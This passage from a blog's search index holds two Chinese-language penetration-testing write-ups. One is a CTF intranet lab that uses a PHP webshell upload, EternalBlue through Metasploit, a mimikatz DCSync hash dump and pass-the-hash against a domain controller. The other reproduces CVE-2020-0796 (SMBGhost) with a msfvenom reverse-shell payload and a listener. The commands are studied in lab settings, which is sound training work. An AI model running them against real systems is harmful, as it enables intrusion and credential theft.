class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span>    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>这里运行python脚本的时候可以挂上proxifier。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140949647.png" alt="img"></p><p>然后就可以直接python脚本去打了，本身是达不到内网的，这样相当于挂上了代理。同时后面蚁剑也就不用配置一遍代理了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140949644.png" alt="img"></p><p>然后上蚁剑连接即可。然后我们可以在C:&#x2F;Users&#x2F;Administrator&#x2F;flag里面找到flag02.txt文件。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140950314.png" alt="img"></p><p>得到第二段flag为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2ce3-4813-87d4-</span><br></pre></td></tr></table></figure><p>拼接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>然后这个flag文件里面是有提示的，叫我们去攻击DC。这台根据前面ai分析版本较新可能不好拿到更高权限，所以我们直接用永恒之蓝那台。上kali。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">setg proxies socks5 ip:1234</span><br><span class="line"></span><br><span class="line">setg ReverseAllowProxy true</span><br><span class="line"></span><br><span class="line">search ms17_010</span><br></pre></td></tr></table></figure><p>我们选择第一个就行了，use 0。</p><p>我们还需要修改payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"></span><br><span class="line">set RHOSTS 172.22.1.21</span><br></pre></td></tr></table></figure><p>去正向连接。但是我这么设置好像不行？用proxychains4 msfconsole就行了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140950369.png" alt="img"></p><p>成功攻击。这里我们利用永恒之蓝打完后就是system权限了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140950551.png" alt="img"></p><p>前面我们已经收集到了域的一些信息。</p><p>所在域为：xiaorang.lab</p><p>收集域内用户hash。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140950665.png" alt="img"></p><p>可以拿到administrator的hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure><p> 再用crackmapexec打PTH拿下域控。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140950739.png" alt="img"></p><p>攻击成功，拿到最后一个flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure><p>总的flag为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><p><a href="https://xz.aliyun.com/t/12115?time__1311=GqGxRDuDg7iQi=D/Y2KBKefgDn0c3=a4D">https://xz.aliyun.com/t/12115?time__1311=GqGxRDuDg7iQi%3DD%2FY2KBKefgDn0c3%3Da4D</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/141316323">https://blog.csdn.net/uuzeray/article/details/141316323</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>永恒之黑漏洞复现（CVE-2020-0796）</title>
      <link href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-0796%EF%BC%89/"/>
      <url>/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-0796%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><a href="https://developer.aliyun.com/article/1220246">通过资料查询</a>：<br>据了解，凡政府机构、企事业单位网络中采用Windows 10 1903 之后的所有终端节点，如Windows家用版、专业版、企业版、教育版，Windows 10 1903 (19H1)、Windows 10 1909、 Windows Server 19H1 均为潜在攻击目标，Windows7 不受影响。</p><p>先附带几个参考链接<br><a href="https://github.com/eerykitty/CVE-2020-0796-PoC">POC（蓝屏）</a><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">EXP（RCE）</a><a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">检测工具</a><br>在这我们使用kali作为攻击机，win10作为靶机。</p><p>攻击思路图<img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112329707.jpeg" alt="iwEcAqNwbmcDAQTRBSkF0QPHBrCpTMtAf1RCcQZ3L0sHU-sAB9JSeJnACAAJomltCgAL0gAA740.png_720x720q90.jpg"></p><h2 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h2><h3 id="1-先把两个poc和exp的源码放入到攻击机里面。"><a href="#1-先把两个poc和exp的源码放入到攻击机里面。" class="headerlink" title="1.先把两个poc和exp的源码放入到攻击机里面。"></a>1.先把两个poc和exp的源码放入到攻击机里面。</h3><p>我们将github上的源码下下来后放到物理机上再复制或者直接拖到kali里面去。<br>（如果物理机的文件拖不进去可以参考如下）利用一段python的指令<br>python -m http.server [port]<br>命令的目的是启动一个简单的HTTP服务器，监听本地的80端口，以便可以通过HTTP协议访问服务器上的文件。<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112329393.png" alt="image.png"><br>在我们开启之后就可以用浏览器去访问了<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112329185.png" alt="image.png"><br>在这里面我们可以将下好的两份源码解压出来。<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112331619.png" alt="image.png"></p><h3 id="2-下载python运行所需要的库"><a href="#2-下载python运行所需要的库" class="headerlink" title="2.下载python运行所需要的库"></a>2.下载python运行所需要的库</h3><p>pip install ntlm_auth<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330604.png" alt="image.png"><br>这里黄色也是正常的。</p><h3 id="3-python运行脚本-ip-造成靶机蓝屏-验证POC"><a href="#3-python运行脚本-ip-造成靶机蓝屏-验证POC" class="headerlink" title="3.python运行脚本+ip 造成靶机蓝屏 验证POC"></a>3.python运行脚本+ip 造成靶机蓝屏 验证POC</h3><p>python CVE-2020-0796.py [靶机-ip]<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330565.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330027.png" alt="image.png"></p><h3 id="4-利用msf生成木马"><a href="#4-利用msf生成木马" class="headerlink" title="4.利用msf生成木马"></a>4.利用msf生成木马</h3><p>在RCE文件夹里面打开终端<br>输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[kali-ip] LPORT=[5555] -b &#x27;\x00&#x27; -i 1 -f python &gt; exploit</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330940.png" alt="image.png"><br>在文件夹里面生成了一个exploit文件。<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330668.png" alt="image.png"></p><h3 id="5-用生成的shellcode将POC文件里exploit-py中的部分替换掉"><a href="#5-用生成的shellcode将POC文件里exploit-py中的部分替换掉" class="headerlink" title="5.用生成的shellcode将POC文件里exploit.py中的部分替换掉"></a>5.用生成的shellcode将POC文件里exploit.py中的部分替换掉</h3><p>使用vim</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit</span><br><span class="line">:%s/buf/USER_PAYLOAD</span><br><span class="line">:wq!</span><br></pre></td></tr></table></figure><p>将buf替换成USER_PAYLOAD保存<br>打开exploit文件和exploit.py<br>将exploit中的所有代码复制粘贴替换掉exploit.py中的第二段红色部分<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330773.png" alt="image.png"></p><h3 id="6-攻击机开启监听"><a href="#6-攻击机开启监听" class="headerlink" title="6.攻击机开启监听"></a>6.攻击机开启监听</h3><p>在RCE文件夹中打开终端，分别输入下面代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost [kali-ip]</span><br><span class="line">set lport [前面设置的端口]</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330676.png" alt="image.png"></p><h3 id="7-运行exp攻击靶机"><a href="#7-运行exp攻击靶机" class="headerlink" title="7.运行exp攻击靶机"></a>7.运行exp攻击靶机</h3><p>因为概率很小，所以我们要不断重复去打<br>不断重复：<strong>python exploit.py -ip [靶机-ip]</strong><br>下面是都可能出现的界面：<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330321.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330591.png" alt="image.png"><br>这个报错和蓝屏有关是正常现象。<img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330164.png" alt="image.png"></p><p>最后攻击成功时，监听的地方会有回复，由于没有打出来，就直接复制其他师傅攻击成功的图片了。<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330870.bmp" alt="m6crnh0p.bmp">最后RCE<br><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202407112330438.bmp" alt="a4gnwnsl.bmp"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
